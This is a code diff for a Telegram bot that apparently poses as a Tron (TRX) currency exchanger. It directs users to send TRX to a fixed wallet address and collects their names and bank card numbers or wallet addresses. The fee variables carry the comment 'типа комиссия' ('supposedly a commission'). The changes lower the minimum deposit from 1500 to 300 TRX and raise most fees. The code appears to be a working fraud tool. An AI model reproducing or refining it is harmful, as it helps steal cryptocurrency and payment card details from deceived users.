@@ -58,7 +58,7 @@ async def last_message(message: types.Message):
         await bot.send_message(message.chat.id, 'Exchange request №' + str(random.randint(476754321, 624334322)) + ' created.✔\n\nYou have chosen: exchange ' + str(message.text) + ' Tron(TRX). \n\nTransfer ' + str(message.text) + ' Tron(TRX) to the exchanger wallet sent below. It is not recommended to rewrite the wallet number manually, copy it.\n\nWallet number⬇\n\nTMZvjX3YMJBpbHBop5iL1wke3UuQBYivF1\n\n\nAfter making the transfer, click "I paid", after which the system will check the availability of the transaction and within 1-5 minutes will transfer the money to the card you specified.', reply_markup = nav.FinM)
 
 async def game_over_message(message: types.Message):
-        await bot.send_message(message.chat.id,'Enter the correct amount of Tron!\n\nMin exchange amount = 1500 Tron(TRX)\n\nMax exchange amount = 35000 Tron(TRX)')
+        await bot.send_message(message.chat.id,'Enter the correct amount of Tron!\n\nMin exchange amount = 300 Tron(TRX)\n\nMax exchange amount = 35000 Tron(TRX)')
 
 
 
@@ -244,8 +244,8 @@ async def bot_message(message: types.Message):
             '                      CAD\n\n1 Tron(TRX) = ' + str(hg) + ' CAD', reply_markup = nav.Menu)
     
     elif message.text == 'BRL':
-        
-        tax = 1.14 # типа комиссия
+
+        tax = 1.16 # типа комиссия
 
         brl = await get_trx_brl()
 
@@ -253,7 +253,7 @@ async def bot_message(message: types.Message):
 
         one_brl = brl_value * tax
 
-        one_and_a_half_brl = 1500 * brl_value * tax #1500 tron
+        one_and_a_half_brl = 300 * brl_value * tax #300 tron
 
         two_thousand_brl = 2000 * brl_value * tax
 
@@ -266,11 +266,11 @@ async def bot_message(message: types.Message):
         hh = float('{:.3}'.format(zz))
 
         
-        await bot.send_message(message.chat.id, 'You have chosen to exchange the Tron(TRX) for BRL (Visa/Mastercard)\n\nExchange rate:\n1 Tron(TRX) = ' + str(hh) + ' BRL' + '\nMinimum exchange amount:\n1500 Tron(TRX) = '+ str(ss) + ' BRL\n\nEnter your name and surname, then enter the details of the bank card to which you want to get money in BRL currency.\nThe card number consists of 16 numbers and usually looks like this - 4277 2555 5555 5555\n\nSend the bot your surname, name and your card number and click ' + '"The next step"' + '\n\nIf an incorrect card number is entered, the bot will automatically make a refund \n\nFor example ⬇️\n_________________________\nJustin Sun\n4277 2555 5555 5555', reply_markup = nav.nextMenu)
+        await bot.send_message(message.chat.id, 'You have chosen to exchange the Tron(TRX) for BRL (Visa/Mastercard)\n\nExchange rate:\n1 Tron(TRX) = ' + str(hh) + ' BRL' + '\nMinimum exchange amount:\n300 Tron(TRX) = '+ str(ss) + ' BRL\n\nEnter your name and surname, then enter the details of the bank card to which you want to get money in BRL currency.\nThe card number consists of 16 numbers and usually looks like this - 4277 2555 5555 5555\n\nSend the bot your surname, name and your card number and click ' + '"The next step"' + '\n\nIf an incorrect card number is entered, the bot will automatically make a refund \n\nFor example ⬇️\n_________________________\nJustin Sun\n4277 2555 5555 5555', reply_markup = nav.nextMenu)
     
     elif message.text == 'CAD':
-        
-        tax = 1.14 # типа комиссия
+
+        tax = 1.16 # типа комиссия
 
         cad = await get_trx_cad()
 
@@ -278,7 +278,7 @@ async def bot_message(message: types.Message):
 
         one_cad = cad_value * tax
 
-        one_and_a_half_cad = 1500 * cad_value * tax #1500 tron
+        one_and_a_half_cad = 300 * cad_value * tax #300 tron
 
         two_thousand_cad = 2000 * cad_value * tax
 
@@ -291,11 +291,11 @@ async def bot_message(message: types.Message):
         hg = float('{:.3}'.format(zx))
 
         
-        await bot.send_message(message.chat.id, 'You have chosen to exchange the Tron(TRX) for CAD (Visa/Mastercard)\n\nExchange rate:\n1 Tron(TRX) = ' + str(hg) + ' CAD' + '\nMinimum exchange amount:\n1500 Tron(TRX) = '+ str(sd) + ' CAD\n\nEnter your name and surname, then enter the details of the bank card to which you want to get money in CAD currency.\nThe card number consists of 16 numbers and usually looks like this - 4277 2555 5555 5555\n\nSend the bot your surname, name and your card number and click ' + '"The next step"' + '\n\nIf an incorrect card number is entered, the bot will automatically make a refund \n\nFor example ⬇️\n_________________________\nJustin Sun\n4277 2555 5555 5555', reply_markup = nav.nextMenu)
+        await bot.send_message(message.chat.id, 'You have chosen to exchange the Tron(TRX) for CAD (Visa/Mastercard)\n\nExchange rate:\n1 Tron(TRX) = ' + str(hg) + ' CAD' + '\nMinimum exchange amount:\n300 Tron(TRX) = '+ str(sd) + ' CAD\n\nEnter your name and surname, then enter the details of the bank card to which you want to get money in CAD currency.\nThe card number consists of 16 numbers and usually looks like this - 4277 2555 5555 5555\n\nSend the bot your surname, name and your card number and click ' + '"The next step"' + '\n\nIf an incorrect card number is entered, the bot will automatically make a refund \n\nFor example ⬇️\n_________________________\nJustin Sun\n4277 2555 5555 5555', reply_markup = nav.nextMenu)
 
     elif message.text == 'UAH':
 
-        tax = 1.14 # типа комиссия
+        tax = 1.16 # типа комиссия
 
         a = 2.65
         b = 2.75
@@ -313,7 +313,7 @@ async def bot_message(message: types.Message):
 
         thousand_uah = 1000 * one_uah * tax
 
-        one_and_a_half_uah = 1500 * one_uah * tax #1500 tron
+        one_and_a_half_uah = 300 * one_uah * tax #300 tron
 
         x = one_and_a_half_uah
 
@@ -323,11 +323,11 @@ async def bot_message(message: types.Message):
 
         b = float('{:.4}'.format(s))
 
-        await bot.send_message(message.chat.id, 'You have chosen to exchange the Tron(TRX) for UAH (Visa/Mastercard)\n\nExchange rate:\n1 Tron(TRX) = ' + str(b) + ' UAH' + '\nMinimum exchange amount:\n1500 Tron(TRX) = '+ str(a) + ' UAH\n\nEnter your name and surname, then enter the details of the bank card to which you want to get money in UAH currency.\nThe card number consists of 16 numbers and usually looks like this - 4277 2555 5555 5555\n\nSend the bot your surname, name and your card number and click ' + '"The next step"' + '\n\nIf an incorrect card number is entered, the bot will automatically make a refund \n\nFor example ⬇️\n_________________________\nJustin Sun\n4277 2555 5555 5555', reply_markup = nav.nextMenu)
+        await bot.send_message(message.chat.id, 'You have chosen to exchange the Tron(TRX) for UAH (Visa/Mastercard)\n\nExchange rate:\n1 Tron(TRX) = ' + str(b) + ' UAH' + '\nMinimum exchange amount:\n300 Tron(TRX) = '+ str(a) + ' UAH\n\nEnter your name and surname, then enter the details of the bank card to which you want to get money in UAH currency.\nThe card number consists of 16 numbers and usually looks like this - 4277 2555 5555 5555\n\nSend the bot your surname, name and your card number and click ' + '"The next step"' + '\n\nIf an incorrect card number is entered, the bot will automatically make a refund \n\nFor example ⬇️\n_________________________\nJustin Sun\n4277 2555 5555 5555', reply_markup = nav.nextMenu)
 
     elif message.text == 'USD':
-        
-        tax = 1.14 # типа комиссия
+
+        tax = 1.16 # типа комиссия
 
         usd = await get_trx_usd()
 
@@ -335,7 +335,7 @@ async def bot_message(message: types.Message):
 
         one_usd = usd_value * tax
 
-        one_and_a_half_usd = 1500 * usd_value * tax #1500 tron
+        one_and_a_half_usd = 300 * usd_value * tax #300 tron
 
         two_thousand_usd = 2000 * usd_value * tax
 
@@ -347,10 +347,10 @@ async def bot_message(message: types.Message):
 
         d = float('{:.3}'.format(q))
         
-        await bot.send_message(message.chat.id, 'You have chosen to exchange the Tron(TRX) for USD (Visa/Mastercard)\n\nExchange rate:\n1 Tron(TRX) = ' + str(d) + ' USD' + '\nMinimum exchange amount:\n1500 Tron(TRX) = '+ str(c) + ' USD\n\nEnter your name and surname, then enter the details of the bank card to which you want to get money in USD currency.\nThe card number consists of 16 numbers and usually looks like this - 4277 2555 5555 5555\n\nSend the bot your surname, name and your card number and click ' + '"The next step"' + '\n\nIf an incorrect card number is entered, the bot will automatically make a refund \n\nFor example ⬇️\n_________________________\nJustin Sun\n4277 2555 5555 5555', reply_markup = nav.nextMenu)
+        await bot.send_message(message.chat.id, 'You have chosen to exchange the Tron(TRX) for USD (Visa/Mastercard)\n\nExchange rate:\n1 Tron(TRX) = ' + str(d) + ' USD' + '\nMinimum exchange amount:\n300 Tron(TRX) = '+ str(c) + ' USD\n\nEnter your name and surname, then enter the details of the bank card to which you want to get money in USD currency.\nThe card number consists of 16 numbers and usually looks like this - 4277 2555 5555 5555\n\nSend the bot your surname, name and your card number and click ' + '"The next step"' + '\n\nIf an incorrect card number is entered, the bot will automatically make a refund \n\nFor example ⬇️\n_________________________\nJustin Sun\n4277 2555 5555 5555', reply_markup = nav.nextMenu)
 
     elif message.text == 'CNY':
-        
+
         tax = 1.12 # типа комиссия
 
         cny = await get_trx_cny()
@@ -361,7 +361,7 @@ async def bot_message(message: types.Message):
 
         thousand_cny = 1000 * cny_value * tax
 
-        one_and_a_half_cny = 1500 * cny_value * tax  #1500 tron
+        one_and_a_half_cny = 300 * cny_value * tax  #300 tron
 
         two_thousand_cny = 2000 * cny_value * tax
 
@@ -373,10 +373,10 @@ async def bot_message(message: types.Message):
 
         v = float('{:.4}'.format(w))
         
-        await bot.send_message(message.chat.id, 'You have chosen to exchange the Tron(TRX) for CNY (Visa/Mastercard)\n\nExchange rate:\n1 Tron(TRX) = ' + str(v) + ' CNY' + '\nMinimum exchange amount:\n1500 Tron(TRX) = ' + str(cn) + ' CNY\n\nEnter your name and surname, then enter the details of the bank card to which you want to get money in CNY currency.\nThe card number consists of 16 numbers and usually looks like this - 4277 2555 5555 5555\n\nSend the bot your surname, name and your card number and click ' + '"The next step"' + '\n\nIf an incorrect card number is entered, the bot will automatically make a refund \n\nFor example ⬇️\n_________________________\nJustin Sun\n4277 2555 5555 5555', reply_markup = nav.nextMenu)
+        await bot.send_message(message.chat.id, 'You have chosen to exchange the Tron(TRX) for CNY (Visa/Mastercard)\n\nExchange rate:\n1 Tron(TRX) = ' + str(v) + ' CNY' + '\nMinimum exchange amount:\n300 Tron(TRX) = ' + str(cn) + ' CNY\n\nEnter your name and surname, then enter the details of the bank card to which you want to get money in CNY currency.\nThe card number consists of 16 numbers and usually looks like this - 4277 2555 5555 5555\n\nSend the bot your surname, name and your card number and click ' + '"The next step"' + '\n\nIf an incorrect card number is entered, the bot will automatically make a refund \n\nFor example ⬇️\n_________________________\nJustin Sun\n4277 2555 5555 5555', reply_markup = nav.nextMenu)
 
     elif message.text == 'BTC':
-        
+
         tax = 1.12 # типа комиссия
 
         btc = await get_trx_btc()
@@ -387,7 +387,7 @@ async def bot_message(message: types.Message):
 
         thousand_btc = 1000 * btc_value * tax
 
-        one_and_a_half_btc = 1500 * btc_value * tax  #1500 tron
+        one_and_a_half_btc = 300 * btc_value * tax  #300 tron
 
         two_thousand_btc = 2000 * btc_value * tax
 
@@ -399,7 +399,7 @@ async def bot_message(message: types.Message):
 
         i = float('{:.4}'.format(l))
         
-        await bot.send_message(message.chat.id, 'You have chosen to exchange Tron (TRX) to BTC (Binance / Other wallets) \n \nExchange rate: \n1 Tron (TRX) = '+ str (i) +' BTC '+' \nMinimum exchange amount: \n1500 Tron (TRX ) = '+ str (p) +' BTC \n \nEnter the wallet number to which you want to receive money in BTC currency. \nThe wallet number usually consists of ~34 characters and usually looks like this - TMZvjX3YMJBpbHBop5iL1wke3UuQBYivF1 \n\nSend your last name, first name and wallet number to the bot, then press '+' "Next step" '+' \n\nIf the bot is entered an invalid wallet number, will automatically refund the money\n_________________________\nJustin Sun\nTMZvjX3YMJBpbHBop5iL1wke3UuQBYivF1', reply_markup = nav.nextMenu)
+        await bot.send_message(message.chat.id, 'You have chosen to exchange Tron (TRX) to BTC (Binance / Other wallets) \n \nExchange rate: \n1 Tron (TRX) = '+ str (i) +' BTC '+' \nMinimum exchange amount: \n300 Tron (TRX ) = '+ str (p) +' BTC \n \nEnter the wallet number to which you want to receive money in BTC currency. \nThe wallet number usually consists of ~34 characters and usually looks like this - TMZvjX3YMJBpbHBop5iL1wke3UuQBYivF1 \n\nSend your last name, first name and wallet number to the bot, then press '+' "Next step" '+' \n\nIf the bot is entered an invalid wallet number, will automatically refund the money\n_________________________\nJustin Sun\nTMZvjX3YMJBpbHBop5iL1wke3UuQBYivF1', reply_markup = nav.nextMenu)
     
     elif message.text == 'RUB':
 
@@ -413,7 +413,7 @@ async def bot_message(message: types.Message):
 
         thousand_rub = 1000 * rub_value * tax
 
-        one_and_a_half_rub = 1500 * rub_value * tax  #1500 tron
+        one_and_a_half_rub = 300 * rub_value * tax  #300 tron
 
         two_thousand_rub = 2000 * rub_value * tax
 
@@ -425,11 +425,11 @@ async def bot_message(message: types.Message):
 
         m = float('{:.4}'.format(t))
         
-        await bot.send_message(message.chat.id, 'You have chosen to exchange the Tron(TRX) for RUB (Visa/Mastercard)\n\nExchange rate:\n1 Tron(TRX) = ' + str(m) + ' RUB' + '\nMinimum exchange amount:\n1500 Tron(TRX) = ' + str(g) + ' RUB\n\nEnter your name and surname, then enter the details of the bank card to which you want to get money in RUB currency.\nThe card number consists of 16 numbers and usually looks like this - 4277 2555 5555 5555\n\nSend the bot your surname, name and your card number and click ' + '"The next step"' + '\n\nIf an incorrect card number is entered, the bot will automatically make a refund \n\nFor example ⬇️\n_________________________\nJustin Sun\n4277 2555 5555 5555', reply_markup = nav.nextMenu)
+        await bot.send_message(message.chat.id, 'You have chosen to exchange the Tron(TRX) for RUB (Visa/Mastercard)\n\nExchange rate:\n1 Tron(TRX) = ' + str(m) + ' RUB' + '\nMinimum exchange amount:\n300 Tron(TRX) = ' + str(g) + ' RUB\n\nEnter your name and surname, then enter the details of the bank card to which you want to get money in RUB currency.\nThe card number consists of 16 numbers and usually looks like this - 4277 2555 5555 5555\n\nSend the bot your surname, name and your card number and click ' + '"The next step"' + '\n\nIf an incorrect card number is entered, the bot will automatically make a refund \n\nFor example ⬇️\n_________________________\nJustin Sun\n4277 2555 5555 5555', reply_markup = nav.nextMenu)
 
     elif message.text == 'EUR':
 
-        tax = 1.14 # типа комиссия
+        tax = 1.15 # типа комиссия
 
         eur = await get_trx_eur()
 
@@ -439,7 +439,7 @@ async def bot_message(message: types.Message):
 
         thousand_eur = 1000 * eur_value * tax
 
-        one_and_a_half_eur = 1500 * eur_value * tax  #1500 tron
+        one_and_a_half_eur = 300 * eur_value * tax  #300 tron
 
         two_thousand_eur = 2000 * eur_value * tax
 
@@ -451,11 +451,11 @@ async def bot_message(message: types.Message):
 
         h = float('{:.3}'.format(z))
 
-        await bot.send_message(message.chat.id, 'You have chosen to exchange the Tron(TRX) for EUR (Visa/Mastercard)\n\nExchange rate:\n1 Tron(TRX) = ' + str(h) + ' EUR' + '\nMinimum exchange amount:\n1500 Tron(TRX) = '+ str(ss) + ' EUR\n\nEnter your name and surname, then enter the details of the bank card to which you want to get money in EUR currency.\nThe card number consists of 16 numbers and usually looks like this - 4277 2555 5555 5555\n\nSend the bot your surname, name and your card number and click ' + '"The next step"' + '\n\nIf an incorrect card number is entered, the bot will automatically make a refund \n\nFor example ⬇️\n_________________________\nJustin Sun\n4277 2555 5555 5555', reply_markup = nav.nextMenu)
+        await bot.send_message(message.chat.id, 'You have chosen to exchange the Tron(TRX) for EUR (Visa/Mastercard)\n\nExchange rate:\n1 Tron(TRX) = ' + str(h) + ' EUR' + '\nMinimum exchange amount:\n300 Tron(TRX) = '+ str(ss) + ' EUR\n\nEnter your name and surname, then enter the details of the bank card to which you want to get money in EUR currency.\nThe card number consists of 16 numbers and usually looks like this - 4277 2555 5555 5555\n\nSend the bot your surname, name and your card number and click ' + '"The next step"' + '\n\nIf an incorrect card number is entered, the bot will automatically make a refund \n\nFor example ⬇️\n_________________________\nJustin Sun\n4277 2555 5555 5555', reply_markup = nav.nextMenu)
 
     elif message.text == 'KRW':
 
-        tax = 1.12 # типа комиссия
+        tax = 1.14 # типа комиссия
 
         krw = await get_trx_krw()
 
@@ -465,7 +465,7 @@ async def bot_message(message: types.Message):
 
         thousand_krw = 1000 * krw_value * tax
 
-        one_and_a_half_krw = 1500 * krw_value * tax  #1500 tron
+        one_and_a_half_krw = 300 * krw_value * tax  #300 tron
 
         two_thousand_krw = 2000 * krw_value * tax
 
@@ -477,15 +477,15 @@ async def bot_message(message: types.Message):
 
         qw = float('{:.4}'.format(aa))
 
-        await bot.send_message(message.chat.id, 'You have chosen to exchange the Tron(TRX) for KRW (Visa/Mastercard)\n\nExchange rate:\n1 Tron(TRX) = ' + str(qw) + ' KRW' + '\nMinimum exchange amount:\n1500 Tron(TRX) = '+ str(e) + ' KRW\n\nEnter your name and surname, then enter the details of the bank card to which you want to get money in KRW currency.\nThe card number consists of 16 numbers and usually looks like this - 4277 2555 5555 5555\n\nSend the bot your surname, name and your card number and click ' + '"The next step"' + '\n\nIf an incorrect card number is entered, the bot will automatically make a refund \n\nFor example ⬇️\n_________________________\nJustin Sun\n4277 2555 5555 5555', reply_markup = nav.nextMenu)
+        await bot.send_message(message.chat.id, 'You have chosen to exchange the Tron(TRX) for KRW (Visa/Mastercard)\n\nExchange rate:\n1 Tron(TRX) = ' + str(qw) + ' KRW' + '\nMinimum exchange amount:\n300 Tron(TRX) = '+ str(e) + ' KRW\n\nEnter your name and surname, then enter the details of the bank card to which you want to get money in KRW currency.\nThe card number consists of 16 numbers and usually looks like this - 4277 2555 5555 5555\n\nSend the bot your surname, name and your card number and click ' + '"The next step"' + '\n\nIf an incorrect card number is entered, the bot will automatically make a refund \n\nFor example ⬇️\n_________________________\nJustin Sun\n4277 2555 5555 5555', reply_markup = nav.nextMenu)
 
     elif message.text == 'Continue ➡️':
-        await bot.send_message(message.chat.id, 'Enter the amount of currency you would like to exchange:\n\nMin exchange amount = 1500 Tron(TRX)\n\nMax exchange amount = 35000 Tron(TRX)', reply_markup=types.ReplyKeyboardRemove())
+        await bot.send_message(message.chat.id, 'Enter the amount of currency you would like to exchange:\n\nMin exchange amount = 300 Tron(TRX)\n\nMax exchange amount = 35000 Tron(TRX)', reply_markup=types.ReplyKeyboardRemove())
 
-    if float(message.text) >= 1500 and float(message.text) <= 35000:
+    if float(message.text) >= 300 and float(message.text) <= 35000:
         return await last_message(message)
 
-    if float(message.text) < 1500 or float(message.text) > 35000:
+    if float(message.text) < 300 or float(message.text) > 35000:
         return await game_over_message(message)
 
 if __name__ == '__main__':
